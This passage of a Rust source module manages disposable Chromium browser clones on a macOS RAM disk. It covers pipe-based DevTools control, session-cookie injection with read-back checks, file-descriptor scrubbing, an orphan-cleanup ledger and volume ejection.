//! Throwaway browser clones: a Chrome or Brave process on a temporary profile
//! that lives on a RAM disk and dies with it.
//!
//! This is deliberately not part of [`crate::browser_bridge`]. That supervisor
//! attaches to a tab in the browser the user is already using; a clone is a
//! separate process Bridge starts, owns, and destroys. Nothing here reaches the
//! user's own browser or profile.
//!
//! What a clone guarantees, and how:
//!
//! - **No network surface.** The browser is driven over `--remote-debugging-pipe`
//!   (file descriptors 3 and 4, NUL-delimited JSON). No TCP debugging port is
//!   ever opened, and [`validate_launch_args`] refuses to launch if one is
//!   requested, so another local process cannot reach the browser's DevTools.
//! - **No inherited descriptors.** Before exec, the child marks every
//!   descriptor above the pipe close-on-exec, so the browser starts holding
//!   only stdio and fds 3/4, never a handle to Bridge's database, sockets, or
//!   terminals that a library forgot to mark.
//! - **Invisible volume.** The RAM disk is formatted without being mounted and
//!   then mounted `nobrowse,nosuid,nodev` under the Bridge-owned dir, so it
//!   never appears in Finder or on the Desktop.
//! - **No disk residue.** The profile lives on an HFS+ RAM disk mounted under a
//!   Bridge-owned temp dir. [`CloneSupervisor::destroy`] kills the browser's
//!   whole process group, ejects the volume, and removes the mount point.
//! - **Session cookies stay in memory while the clone runs, and the RAM disk is
//!   the real boundary.** [`CloneSupervisor::load_session`] injects cookies with
//!   `Storage.setCookies` and no `expires`, so they are session cookies: CDP's
//!   input type has no `session` field, so the flag is achieved by omitting
//!   `expires` and *proven* by reading each cookie back and requiring
//!   `session: true`. While the browser runs these are never written to the
//!   profile's `Cookies` file (verified against a real Chrome). They are *not*
//!   guaranteed memory-only forever: modern Chromium flushes session cookies to
//!   the profile `Cookies` database on shutdown (for session restore). That is
//!   why the disk guarantee does not rest on cookie residence — it rests on the
//!   RAM disk. [`CloneSupervisor::destroy`] SIGKILLs the whole process group (no
//!   graceful flush) and then ejects the volume, so the profile and anything
//!   Chromium may have flushed into it are gone with the RAM disk and never
//!   reach the real disk.
//! - **Crashes do not leak RAM.** Each clone is recorded (pid and mount path,
//!   nothing else) in a small ledger before it exists.
//!   [`CloneSupervisor::sweep_orphans`] runs at core boot, kills any recorded
//!   clone that outlived its core, and ejects its volume.
//!
//! Where cookies come from is not decided here: [`CookieSpec`] is a plain value.
//!
//! Everything blocks (subprocesses, sleeps, pipe reads). Hosts call it from
//! `spawn_blocking`, like the rest of the process-touching core.

use crate::browser_clone_guard::{EgressProxy, GuardState};
use crate::{adapters, browser_clone_guard, diagnostics};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    collections::{HashMap, HashSet},
    fmt,
    fs::{self, File},
    io::{self, BufRead, BufReader, Read, Write},
    os::unix::{
        fs::{MetadataExt, PermissionsExt},
        io::{AsRawFd, FromRawFd, OwnedFd},
        process::CommandExt,
    },
    path::{Path, PathBuf},
    process::{Child, Command, Stdio},
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        mpsc, Arc, Mutex, MutexGuard,
    },
    thread,
    time::{Duration, Instant},
};
use thiserror::Error;
use uuid::Uuid;

/// The only debugging transport a clone is ever launched with.
const PIPE_FLAG: &str = "--remote-debugging-pipe";
/// Largest single CDP message accepted from the browser. `Storage.getCookies`
/// on a busy profile is the biggest thing Bridge asks for; anything past this
/// is a misbehaving peer, not a reply.
const FRAME_LIMIT_BYTES: usize = 32 * 1024 * 1024;
const MOUNTS_DIR_NAME: &str = "bridge-clones";
const PROFILE_DIR_NAME: &str = "profile";
const VOLUME_LABEL: &str = "BridgeClone";
const DEFAULT_RAM_DISK_MIB: u64 = 256;
const DEFAULT_READY_TIMEOUT: Duration = Duration::from_secs(20);
const DEFAULT_CALL_TIMEOUT: Duration = Duration::from_secs(10);
/// Chromium's HTTP cache cap. The RAM disk is small on purpose, and a
/// media-heavy site (YouTube) would otherwise fill it and fail writes mid-test.
const DISK_CACHE_BYTES: u64 = 64 * 1024 * 1024;
/// How long a SIGKILLed clone's process group gets to disappear.
const KILL_WAIT: Duration = Duration::from_secs(2);
/// Highest descriptor a clone's child scrubs before exec. `sysconf` can
/// report an unbounded limit, and a loop to that is not free.
const FD_SCRUB_CEILING: libc::c_int = 65_536;

// System tools by absolute path: a daemon's PATH is not something to trust,
// and these are the ones that mount, format, and inspect processes.
const HDIUTIL: &str = "/usr/bin/hdiutil";
const DISKUTIL: &str = "/usr/sbin/diskutil";
const NEWFS_HFS: &str = "/sbin/newfs_hfs";
const PS: &str = "/bin/ps";

#[derive(Debug, Error)]
pub enum CloneError {
    #[error("no supported browser found (looked for Chrome, Brave, Chrome for Testing, Chromium)")]
    NoBrowser,
    #[error("RAM disk: {0}")]
    Volume(String),
    #[error("could not launch the browser: {0}")]
    Launch(String),
    #[error("the browser did not answer within {waited_ms} ms")]
    NotReady { waited_ms: u64 },
    #[error("the browser exited")]
    BrowserExited,
    #[error("browser call {method} timed out")]
    Timeout { method: String },
    #[error("browser call {method} failed: {message}")]
    Cdp { method: String, message: String },
    #[error("no such clone: {0}")]
    UnknownClone(String),
    #[error("invalid cookie: {0}")]
    InvalidCookie(String),
    #[error("the browser did not store cookie {name}")]
    CookieRejected { name: String },
    #[error("cookie {name} was stored as a persistent cookie, not a session cookie")]
    CookieNotSession { name: String },
    #[error("could not stop browser process group {pid}")]
    KillFailed { pid: u32 },
    #[error("clone ledger: {0}")]
    Ledger(String),
}

/// `SameSite` in the spelling CDP uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SameSite {
    Strict,
    Lax,
    None,
}

impl SameSite {
    fn as_cdp(self) -> &'static str {
        match self {
            Self::Strict => "Strict",
            Self::Lax => "Lax",
            Self::None => "None",
        }
    }
}

/// A cookie to load into a clone. A plain value: nothing here knows where it
/// came from, and there is deliberately no expiry, because every cookie loaded
/// into a clone is a session cookie.
#[derive(Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CookieSpec {
    pub name: String,
    pub value: String,
    pub domain: String,
    pub path: String,
    pub secure: bool,
    pub http_only: bool,
    pub same_site: Option<SameSite>,
}

impl fmt::Debug for CookieSpec {
    /// The value is the secret; it never reaches a log line or a panic message.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("CookieSpec")
            .field("name", &self.name)
            .field("value", &"<redacted>")
            .field("domain", &self.domain)
            .field("path", &self.path)
            .field("secure", &self.secure)
            .field("http_only", &self.http_only)
            .field("same_site", &self.same_site)
            .finish()
    }
}

impl CookieSpec {
    fn path(&self) -> &str {
        if self.path.is_empty() {
            "/"
        } else {
            &self.path
        }
    }

    /// Reject what Chromium would reject, before anything is sent, with a
    /// message that names the cookie but never its value.
    fn validate(&self) -> Result<(), CloneError> {
        let invalid = |why: &str| {
            Err(CloneError::InvalidCookie(format!(
                "{:?}: {why}",
                self.name
            )))
        };
        if self.name.is_empty() {
            return invalid("the name is empty");
        }
        if self
            .name
            .chars()
            .any(|c| c.is_control() || c.is_whitespace() || c == '=' || c == ';')
        {
            return invalid("the name has forbidden characters");
        }
        if self.value.chars().any(char::is_control) {
            return invalid("the value has control characters");
        }
        if self.domain.is_empty() || self.domain.chars().any(|c| c.is_control() || c == '/') {
            return invalid("the domain is empty or malformed");
        }
        if !self.path().starts_with('/') {
            return invalid("the path must start with /");
        }
        if self.same_site == Some(SameSite::None) && !self.secure {
            return invalid("SameSite=None requires Secure");
        }
        Ok(())
    }

    /// The `Network.CookieParam` for this cookie. There is no `expires` key:
    /// that absence is what makes it a session cookie.
    fn to_cdp(&self) -> Value {
        let mut param = json!({
            "name": self.name,
            "value": self.value,
            "domain": self.domain,
            "path": self.path(),
            "secure": self.secure,
            "httpOnly": self.http_only,
        });
        if let Some(same_site) = self.same_site {
            param["sameSite"] = json!(same_site.as_cdp());
        }
        param
    }
}

#[derive(Debug, Clone)]
pub struct CloneConfig {
    /// Browser executable to use. Wins over discovery.
    pub browser: Option<PathBuf>,
    /// Executables to try, in order, when `browser` is unset. `None` means the
    /// standard macOS install locations.
    pub search_paths: Option<Vec<PathBuf>>,
    /// How long `spawn_clone` waits for the browser to answer over the pipe.
    pub ready_timeout: Duration,
    /// Bound on every later CDP call.
    pub call_timeout: Duration,
    pub ram_disk_mib: u64,
    pub headless: bool,
    /// Arm the leak guard: launch the clone behind the egress proxy and
    /// intercept every request. The clone's [`GuardState`] starts empty
    /// (default-deny), so a guarded clone reaches nothing until a caller allows
    /// hosts on it. Part 3 turns this on whenever a real session is loaded.
    pub guarded: bool,
}

impl Default for CloneConfig {
    fn default() -> Self {
        Self {
            browser: None,
            search_paths: None,
            ready_timeout: DEFAULT_READY_TIMEOUT,
            call_timeout: DEFAULT_CALL_TIMEOUT,
            ram_disk_mib: DEFAULT_RAM_DISK_MIB,
            headless: false,
            guarded: false,
        }
    }
}

impl CloneConfig {
    /// The default configuration plus `BRIDGE_CLONE_BROWSER`, an explicit
    /// browser executable for machines where discovery would pick the wrong one.
    pub fn from_env() -> Self {
        Self {
            browser: std::env::var_os("BRIDGE_CLONE_BROWSER")
                .filter(|value| !value.is_empty())
                .map(PathBuf::from),
            ..Self::default()
        }
    }
}

/// What a caller learns about a running clone. The pid and mount path are also
/// what the ledger keeps; the product string is the browser's own version.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CloneInfo {
    pub id: String,
    pub pid: u32,
    pub mount: PathBuf,
    pub product: String,
}

/// What a sweep did, for the boot log and for tests.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct SweepReport {
    /// Leader pids of process groups that were stopped.
    pub killed: Vec<u32>,
    /// Mounts that are gone.
    pub ejected: Vec<PathBuf>,
    /// Records whose mount was outside the clone mounts dir; dropped untouched.
    pub rejected: Vec<PathBuf>,
    /// Records kept for the next boot, with why.
    pub failed: Vec<(PathBuf, String)>,
}

impl SweepReport {
    pub fn is_empty(&self) -> bool {
        self.killed.is_empty()
            && self.ejected.is_empty()
            && self.rejected.is_empty()
            && self.failed.is_empty()
    }
}

/// The first supported browser installed in a standard location, if any.
pub fn discover_browser() -> Option<PathBuf> {
    default_browser_candidates()
        .into_iter()
        .find(|candidate| candidate.is_file())
}

fn default_browser_candidates() -> Vec<PathBuf> {
    const APPS: [&str; 4] = [
        "Google Chrome",
        "Brave Browser",
        "Google Chrome for Testing",
        "Chromium",
    ];
    let mut roots = vec![PathBuf::from("/Applications")];
    if let Some(home) = std::env::var_os("HOME") {
        roots.push(PathBuf::from(home).join("Applications"));
    }
    let mut candidates = Vec::new();
    for app in APPS {
        for root in &roots {
            candidates.push(
                root.join(format!("{app}.app"))
                    .join("Contents/MacOS")
                    .join(app),
            );
        }
    }
    candidates
}

/// Poison is ignored: everything these locks guard is a plain map or a unit
/// whose invariants a panic cannot leave half-written.
fn lock<T>(mutex: &Mutex<T>) -> MutexGuard<'_, T> {
    mutex.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

// ---------------------------------------------------------------- launch args

fn launch_args(profile: &Path, headless: bool) -> Vec<String> {
    let mut args = vec![
        format!("--user-data-dir={}", profile.display()),
        PIPE_FLAG.to_owned(),
        "--no-first-run".to_owned(),
        "--no-default-browser-check".to_owned(),
        // A clone must not read or write the user's Keychain: the profile is
        // throwaway, and a Keychain prompt would block it.
        "--use-mock-keychain".to_owned(),
        "--password-store=basic".to_owned(),
        "--disable-sync".to_owned(),
        "--disable-background-networking".to_owned(),
        "--disable-component-update".to_owned(),
        "--disable-breakpad".to_owned(),
        format!("--disk-cache-size={DISK_CACHE_BYTES}"),
        // Chrome 137 removed --load-extension from branded builds; loading the
        // code under test into the clone goes through the Extensions.loadUnpacked
        // CDP command instead, which this flag enables. It only affects this
        // throwaway process, never the user's browser.
        "--enable-unsafe-extension-debugging".to_owned(),
    ];
    if headless {
        args.push("--headless=new".to_owned());
    }
    args.push("about:blank".to_owned());
    args
}

/// The launch invariants, checked immediately before every spawn so a future
/// edit to [`launch_args`] cannot quietly open a network debugging surface.
fn validate_launch_args(args: &[String]) -> Result<(), CloneError> {
    if args.iter().any(|arg| {
        arg.starts_with("--remote-debugging-port") || arg.starts_with("--remote-debugging-address")
    }) {
        return Err(CloneError::Launch(
            "refusing to expose a TCP debugging port".into(),
        ));
    }
    if !args.iter().any(|arg| arg == PIPE_FLAG) {
        return Err(CloneError::Launch(
            "the debugging pipe flag is missing".into(),
        ));
    }
    if !args.iter().any(|arg| arg.starts_with("--user-data-dir=")) {
        return Err(CloneError::Launch("no temporary profile was given".into()));
    }
    Ok(())
}

// ------------------------------------------------------------- CDP over a pipe

/// One CDP connection over the browser's debugging pipe. The browser reads
/// requests from its fd 3 and writes replies and events to its fd 4; each
/// message is JSON followed by a NUL byte.
type EventHandler = Arc<dyn Fn(&Value) + Send + Sync>;

struct CdpPipe {
    writer: Mutex<File>,
    pending: Arc<Mutex<HashMap<u64, mpsc::Sender<Value>>>>,
    on_event: Arc<Mutex<Option<EventHandler>>>,
    next_id: AtomicU64,
    closed: Arc<AtomicBool>,
}

impl CdpPipe {
    /// Start the reader thread. `from_browser` is the end the browser writes
    /// to; `to_browser` the end it reads from. The thread ends, and every
    /// waiting call fails with [`CloneError::BrowserExited`], when the browser
    /// closes its end.
    fn start(from_browser: File, to_browser: File) -> Arc<Self> {
        let pending: Arc<Mutex<HashMap<u64, mpsc::Sender<Value>>>> = Arc::default();
        let on_event: Arc<Mutex<Option<EventHandler>>> = Arc::default();
        let closed = Arc::new(AtomicBool::new(false));
        {
            let pending = Arc::clone(&pending);
            let on_event = Arc::clone(&on_event);
            let closed = Arc::clone(&closed);
            thread::spawn(move || {
                let mut reader = BufReader::new(from_browser);
                while let Ok(Some(frame)) = read_frame(&mut reader, FRAME_LIMIT_BYTES) {
                    let Ok(message) = serde_json::from_slice::<Value>(&frame) else {
                        continue;
                    };
                    // Events carry no id; only replies to our calls do. An event
                    // goes to the handler if one is registered (the leak guard),
                    // so Fetch.requestPaused can be adjudicated. The handler only
                    // writes (send_no_wait); it never waits on this same reader.
                    let Some(id) = message.get("id").and_then(Value::as_u64) else {
                        if message.get("method").is_some() {
                            let handler = lock(&on_event).clone();
                            if let Some(handler) = handler {
                                handler(&message);
                            }
                        }
                        continue;
                    };
                    let waiter = lock(&pending).remove(&id);
                    if let Some(waiter) = waiter {
                        let _ = waiter.send(message);
                    }
                }
                closed.store(true, Ordering::SeqCst);
                // Dropping the senders wakes every waiter with a disconnect.
                lock(&pending).clear();
            });
        }
        Arc::new(Self {
            writer: Mutex::new(to_browser),
            pending,
            on_event,
            next_id: AtomicU64::new(1),
            closed,
        })
    }

    fn call(&self, method: &str, params: Value, timeout: Duration) -> Result<Value, CloneError> {
        self.request(None, method, params, timeout)
    }

    fn request(
        &self,
        session_id: Option<&str>,
        method: &str,
        params: Value,
        timeout: Duration,
    ) -> Result<Value, CloneError> {
        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
        let (reply_tx, reply_rx) = mpsc::channel();
        lock(&self.pending).insert(id, reply_tx);
        // Checked after registering: the reader sets `closed` before it clears
        // `pending`, so a call can never register into a map nobody will drain.
        if self.closed.load(Ordering::SeqCst) {
            lock(&self.pending).remove(&id);
            return Err(CloneError::BrowserExited);
        }
        let mut message = json!({ "id": id, "method": method, "params": params });
        if let Some(session_id) = session_id {
            message["sessionId"] = json!(session_id);
        }
        let mut frame = serde_json::to_vec(&message).map_err(|error| CloneError::Cdp {
            method: method.to_owned(),
            message: error.to_string(),
        })?;
        frame.push(0);
        let written = lock(&self.writer).write_all(&frame);
        if written.is_err() {
            lock(&self.pending).remove(&id);
            return Err(CloneError::BrowserExited);
        }
        match reply_rx.recv_timeout(timeout) {
            Ok(reply) => match reply.get("error") {
                Some(error) => Err(CloneError::Cdp {
                    method: method.to_owned(),
                    message: error
                        .get("message")
                        .and_then(Value::as_str)
                        .unwrap_or("unknown error")
                        .to_owned(),
                }),
                None => Ok(reply.get("result").cloned().unwrap_or(Value::Null)),
            },
            Err(mpsc::RecvTimeoutError::Timeout) => {
                lock(&self.pending).remove(&id);
                Err(CloneError::Timeout {
                    method: method.to_owned(),
                })
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => Err(CloneError::BrowserExited),
        }
    }

    /// Send a command and do not wait for its reply. Used for a Fetch verdict
    /// dispatched from the event thread, which must not block on a reply the
    /// reader thread it is downstream of would have to deliver.
    fn send_no_wait(&self, session_id: Option<&str>, method: &str, params: Value) {
        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
        let mut message = json!({ "id": id, "method": method, "params": params });
        if let Some(session_id) = session_id {
            message["sessionId"] = json!(session_id);
        }
        if let Ok(mut frame) = serde_json::to_vec(&message) {
            frame.push(0);
            let _ = lock(&self.writer).write_all(&frame);
        }
    }

    /// Call `handler` for every event (a message with a `method` and no `id`).
    /// The handler runs on the reader thread and must not block on a reply; it
    /// may only `send_no_wait`. Replaces any previous handler.
    fn set_event_handler(&self, handler: EventHandler) {
        *lock(&self.on_event) = Some(handler);
    }

    #[cfg(test)]
    fn is_closed(&self) -> bool {
        self.closed.load(Ordering::SeqCst)
    }
}

/// Read one NUL-terminated frame. `Ok(None)` is a clean end of stream, or one
/// that cut a frame short; an oversized frame is an error rather than a buffer
/// that grows with whatever the peer sends.
fn read_frame<R: BufRead>(reader: &mut R, limit: usize) -> io::Result<Option<Vec<u8>>> {
    let mut frame = Vec::new();
    let read = reader
        .by_ref()
        .take(limit as u64 + 1)
        .read_until(0, &mut frame)?;
    if read == 0 {
        return Ok(None);
    }
    if frame.last() == Some(&0) {
        frame.pop();
        return Ok(Some(frame));
    }
    if frame.len() > limit {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "browser frame exceeds the size limit",
        ));
    }
    Ok(None)
}

/// A pipe whose descriptors are at least 10 and close-on-exec. Keeping them
/// clear of 3 and 4 is what lets the child `dup2` its ends onto exactly those
/// numbers without ever colliding with (or being closed by) its own source.
fn os_pipe() -> io::Result<(File, File)> {
    let mut fds = [0 as libc::c_int; 2];
    // SAFETY: `fds` is a valid two-element buffer for pipe(2) to fill.
    if unsafe { libc::pipe(fds.as_mut_ptr()) } != 0 {
        return Err(io::Error::last_os_error());
    }
    // SAFETY: pipe(2) succeeded, so both descriptors are open and owned by us.
    let (read, write) = unsafe { (OwnedFd::from_raw_fd(fds[0]), OwnedFd::from_raw_fd(fds[1])) };
    Ok((File::from(lift_fd(&read)?), File::from(lift_fd(&write)?)))
}

fn lift_fd(fd: &OwnedFd) -> io::Result<OwnedFd> {
    // SAFETY: fcntl(F_DUPFD_CLOEXEC) on a descriptor we own.
    let moved = unsafe { libc::fcntl(fd.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 10) };
    if moved < 0 {
        return Err(io::Error::last_os_error());
    }
    // SAFETY: fcntl returned a fresh descriptor nothing else holds.
    Ok(unsafe { OwnedFd::from_raw_fd(moved) })
}

/// Start the browser in its own process group with the debugging pipe on fd 3
/// (its input) and fd 4 (its output), and connect to it.
fn launch(binary: &Path, args: &[String]) -> Result<(Child, Arc<CdpPipe>), CloneError> {
    validate_launch_args(args)?;
    let launch_error = |error: io::Error| CloneError::Launch(error.to_string());
    let (browser_reads, we_write) = os_pipe().map_err(launch_error)?;
    let (we_read, browser_writes) = os_pipe().map_err(launch_error)?;
    let (read_fd, write_fd) = (browser_reads.as_raw_fd(), browser_writes.as_raw_fd());

    let mut command = Command::new(binary);
    command
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());
    adapters::configure_process_group(&mut command);
    // Rust opens its own files close-on-exec, but a library sharing this
    // process may not (a SQLite handle, a PTY, a socket), and a clone must not
    // leave holding a door into Bridge's own state. Computed before the fork:
    // sysconf is not async-signal-safe.
    // SAFETY: sysconf only reads a limit.
    let fd_limit = match unsafe { libc::sysconf(libc::_SC_OPEN_MAX) } {
        limit if limit > 0 && limit < FD_SCRUB_CEILING as libc::c_long => limit as libc::c_int,
        _ => FD_SCRUB_CEILING,
    };
    // SAFETY: the closure runs between fork and exec and calls only dup2 and
    // fcntl, which are async-signal-safe. The source descriptors are >= 10, so
    // neither dup2 can clobber the other's source. Everything above 4 is marked
    // close-on-exec rather than closed, so std's own exec-error pipe still
    // reports a failed exec to the parent.
    unsafe {
        command.pre_exec(move || {
            if libc::dup2(read_fd, 3) < 0 || libc::dup2(write_fd, 4) < 0 {
                return Err(io::Error::last_os_error());
            }
            for fd in 5..fd_limit {
                libc::fcntl(fd, libc::F_SETFD, libc::FD_CLOEXEC);
            }
            Ok(())
        });
    }
    let child = command
        .spawn()
        .map_err(|error| CloneError::Launch(format!("{}: {error}", binary.display())))?;
    // The parent must not keep the child's ends open, or a dead browser would
    // never show up as end-of-file on the reply pipe.
    drop(browser_reads);
    drop(browser_writes);
    Ok((child, CdpPipe::start(we_read, we_write)))
}

// -------------------------------------------------------------------- cookies

/// Inject `cookies` as session cookies and prove they were stored as such.
fn load_session_over(
    pipe: &CdpPipe,
    cookies: &[CookieSpec],
    timeout: Duration,
) -> Result<(), CloneError> {
    if cookies.is_empty() {
        return Ok(());
    }
    for cookie in cookies {
        cookie.validate()?;
    }
    let params = json!({ "cookies": cookies.iter().map(CookieSpec::to_cdp).collect::<Vec<_>>() });
    pipe.call("Storage.setCookies", params, timeout)?;

    // Chromium silently drops a cookie it does not like inside a batch that
    // otherwise succeeds, and a cookie given an expiry would be written to
    // disk. Read everything back and require each to be present and session.
    let readback = pipe.call("Storage.getCookies", json!({}), timeout)?;
    let stored: &[Value] = readback
        .get("cookies")
        .and_then(Value::as_array)
        .map(Vec::as_slice)
        .unwrap_or(&[]);
    for cookie in cookies {
        let wanted_domain = cookie.domain.trim_start_matches('.');
        let found = stored.iter().find(|entry| {
            entry.get("name").and_then(Value::as_str) == Some(cookie.name.as_str())
                && entry.get("path").and_then(Value::as_str) == Some(cookie.path())
                && entry
                    .get("domain")
                    .and_then(Value::as_str)
                    .is_some_and(|domain| {
                        domain.trim_start_matches('.').eq_ignore_ascii_case(wanted_domain)
                    })
        });
        match found {
            None => {
                return Err(CloneError::CookieRejected {
                    name: cookie.name.clone(),
                })
            }
            Some(entry) if entry.get("session").and_then(Value::as_bool) != Some(true) => {
                return Err(CloneError::CookieNotSession {
                    name: cookie.name.clone(),
                })
            }
            Some(_) => {}
        }
    }
    Ok(())
}

// --------------------------------------------------------------------- volume

/// The filesystem a clone's profile lives on. The real one is a RAM disk; tests
/// substitute a plain directory so the lifecycle runs without `hdiutil`.
trait VolumeBackend: Send + Sync {
    /// Make `mount` a fresh, empty, writable filesystem.
    fn create(&self, mount: &Path, size_mib: u64) -> Result<(), CloneError>;
    /// Make `mount` not exist. Idempotent: an absent mount is success.
    fn eject(&self, mount: &Path) -> Result<(), CloneError>;
}

struct RamDisk;

impl VolumeBackend for RamDisk {
    fn create(&self, mount: &Path, size_mib: u64) -> Result<(), CloneError> {
        let sectors = size_mib.saturating_mul(2048);
        let attached = run_tool(HDIUTIL, &["attach", "-nomount", &format!("ram://{sectors}")])?;
        let device = attached
            .split_whitespace()
            .next()
            .filter(|device| device.starts_with("/dev/disk"))
            .map(str::to_owned)
            .ok_or_else(|| CloneError::Volume("hdiutil did not name a device".into()))?;
        let build = || -> Result<(), CloneError> {
            // Format without mounting. `diskutil erasevolume` would mount the
            // new volume under /Volumes, where Finder shows it, before it could
            // be moved; the user should never see a clone's disk appear.
            run_tool(NEWFS_HFS, &["-v", VOLUME_LABEL, &device])?;
            create_private_dir(mount)?;
            // nobrowse keeps it off the Desktop and out of Finder's sidebar;
            // nothing in a browser profile needs setuid binaries or device
            // nodes.
            run_tool(
                DISKUTIL,
                &[
                    "mount",
                    "-mountOptions",
                    "nobrowse,nosuid,nodev",
                    "-mountPoint",
                    &mount.to_string_lossy(),
                    &device,
                ],
            )?;
            // Once mounted, the mount point shows the volume root's mode, not
            // the 0700 given above. Tighten the root to match.
            fs::set_permissions(mount, fs::Permissions::from_mode(0o700))
                .map_err(|error| CloneError::Volume(format!("{}: {error}", mount.display())))?;
            // Best effort: keep Spotlight from indexing a volume that holds
            // session data. It lives and dies with the volume.
            let _ = fs::write(mount.join(".metadata_never_index"), b"");
            Ok(())
        };
        if let Err(error) = build() {
            // Detach by device: the mount may never have happened.
            let _ = run_tool(HDIUTIL, &["detach", &device, "-force"]);
            let _ = fs::remove_dir(mount);
            return Err(error);
        }
        Ok(())
    }

    fn eject(&self, mount: &Path) -> Result<(), CloneError> {
        if is_mount_point(mount) {
            let target = mount.to_string_lossy();
            if run_tool(HDIUTIL, &["detach", &target, "-force"]).is_err() {
                run_tool(DISKUTIL, &["eject", &target])?;
            }
            if is_mount_point(mount) {
                return Err(CloneError::Volume(format!(
                    "{} is still mounted after eject",
                    mount.display()
                )));
            }
        }
        remove_leftover(mount)
    }
}

fn run_tool(tool: &str, args: &[&str]) -> Result<String, CloneError> {
    let output = Command::new(tool)
        .args(args)
        .stdin(Stdio::null())
        .output()
        .map_err(|error| CloneError::Volume(format!("{tool}: {error}")))?;
    if !output.status.success() {
        let name = Path::new(tool)
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or(tool);
        return Err(CloneError::Volume(format!(
            "{name} {} failed: {}",
            args.first().copied().unwrap_or(""),
            String::from_utf8_lossy(&output.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

fn create_private_dir(path: &Path) -> Result<(), CloneError> {
    fs::create_dir_all(path)
        .and_then(|()| fs::set_permissions(path, fs::Permissions::from_mode(0o700)))
        .map_err(|error| CloneError::Volume(format!("{}: {error}", path.display())))
}

/// A directory on a different device than its parent is a mount point.
fn is_mount_point(path: &Path) -> bool {
    let Ok(meta) = fs::symlink_metadata(path) else {
        return false;
    };
    if !meta.is_dir() {
        return false;
    }
    let Some(parent) = path.parent() else {
        return true;
    };
    fs::symlink_metadata(parent).is_ok_and(|parent_meta| parent_meta.dev() != meta.dev())
}

/// Remove what an ejected volume leaves behind. Callers check
/// [`is_mount_point`] first; this never descends into a live volume.
fn remove_leftover(path: &Path) -> Result<(), CloneError> {
    let removed = match fs::symlink_metadata(path) {
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(error) => Err(error),
        Ok(meta) if meta.is_dir() => fs::remove_dir_all(path),
        Ok(_) => fs::remove_file(path),
    };
    removed.map_err(|error| CloneError::Volume(format!("{}: {error}", path.display())))
}

// --------------------------------------------------------------------- ledger

/// The whole of what is persisted about a clone: which process, which mount.
/// A `None` pid is a volume that exists (or is about to) with no browser yet.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct LedgerRecord {
    pid: Option<u32>,
    mount: PathBuf,
}

/// A JSON file of [`LedgerRecord`]s, rewritten atomically. Absent when empty.
struct Ledger {
    path: PathBuf,
    write_lock: Mutex<()>,
}

impl Ledger {
    fn new(path: PathBuf) -> Self {
        Self {
            path,
            write_lock: Mutex::new(()),
        }
    }

    /// A missing or unreadable ledger is an empty one: writes are atomic, so
    /// an unreadable file is not a torn write, only damage worth a log line.
    fn load(&self) -> Vec<LedgerRecord> {
        let bytes = match fs::read(&self.path) {
            Ok(bytes) => bytes,
            Err(error) if error.kind() == io::ErrorKind::NotFound => return Vec::new(),
            Err(error) => {
                diagnostics::record(&format!("bridge: browser clone ledger unreadable: {error}"));
                return Vec::new();
            }
        };
        serde_json::from_slice(&bytes).unwrap_or_else(|error| {
            diagnostics::record(&format!("bridge: browser clone ledger corrupt: {error}"));
            Vec::new()
        })
    }

    fn upsert(&self, record: LedgerRecord) -> Result<(), CloneError> {
        let _held = lock(&self.write_lock);
        let mut records = self.load();
        if let Some(index) = records.iter().position(|r| r.mount == record.mount) {
            records[index] = record;
        } else {
            records.push(record);
        }
        self.write(&records)
    }

    fn remove(&self, mount: &Path) -> Result<(), CloneError> {
        let _held = lock(&self.write_lock);
        let mut records = self.load();
        records.retain(|record| record.mount != mount);
        self.write(&records)
    }

    fn write(&self, records: &[LedgerRecord]) -> Result<(), CloneError> {
        if records.is_empty() {
            return match fs::remove_file(&self.path) {
                Ok(()) => Ok(()),
                Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(()),
                Err(error) => Err(ledger_error(error)),
            };
        }
        if let Some(parent) = self.path.parent() {
            fs::create_dir_all(parent).map_err(ledger_error)?;
        }
        let bytes = serde_json::to_vec_pretty(records).map_err(ledger_error)?;
        let pending = self.path.with_extension("json.tmp");
        fs::write(&pending, bytes).map_err(ledger_error)?;
        fs::set_permissions(&pending, fs::Permissions::from_mode(0o600)).map_err(ledger_error)?;
        fs::rename(&pending, &self.path).map_err(ledger_error)
    }
}

fn ledger_error(error: impl fmt::Display) -> CloneError {
    CloneError::Ledger(error.to_string())
}

// ----------------------------------------------------------------- supervisor

struct LiveClone {
    child: Child,
    pipe: Arc<CdpPipe>,
    mount: PathBuf,
    /// The leak guard's shared state, when this clone is guarded. Callers reach
    /// it through [`CloneSupervisor::clone_guard`] to allow hosts and register
    /// session secrets. The egress proxy shuts down when this clone drops.
    guard: Option<Arc<Mutex<GuardState>>>,
    _proxy: Option<Arc<EgressProxy>>,
    /// The CDP session of the clone's primary page target, attached lazily the
    /// first time a page-scoped command runs. Page commands (screenshot, input,
    /// accessibility, navigate) need a page session; the browser endpoint cannot
    /// serve them.
    page_session: Mutex<Option<String>>,
}

/// Owns every clone this process started. Independent of
/// [`crate::browser_bridge::BrowserBridgeSupervisor`].
pub struct CloneSupervisor {
    ledger: Ledger,
    mounts_dir: PathBuf,
    backend: Box<dyn VolumeBackend>,
    config: CloneConfig,
    clones: Mutex<HashMap<String, LiveClone>>,
}

impl CloneSupervisor {
    /// `ledger_path` is where the pid + mount records live, next to the other
    /// per-data-dir browser state. Mounts go under a Bridge-owned directory in
    /// the system temp dir; only records in this ledger are ever acted on, so
